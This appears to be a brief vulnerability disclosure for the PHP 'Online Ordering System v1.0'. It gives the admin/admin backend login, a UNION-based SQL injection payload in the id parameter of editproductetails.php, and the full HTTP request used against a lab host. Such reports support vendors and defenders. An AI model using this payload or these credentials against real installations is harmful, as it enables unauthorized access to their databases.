# Online Ordering System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin

vendors: https://www.sourcecodester.com/php/5125/online-ordering-system-using-phpmysql.html

Vulnerability File: /onlineordering/admin/editproductetails.php

Vulnerability location: /onlineordering/admin/editproductetails.php?id=, id

[+] Payload: ip/onlineordering/admin/editproductetails.php?id=12%27%20union%20select%201,2,database(),4,5--+

```sql
GET /onlineordering/admin/editproductetails.php?id=12%27%20union%20select%201,2,database(),4,5--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/167338319-b1ad74f0-5d31-4d29-a4ba-48f222c573cd.png)

![image](https://user-images.githubusercontent.com/54017627/167338286-d2cdeb85-f444-4314-ad82-da803011c796.png)
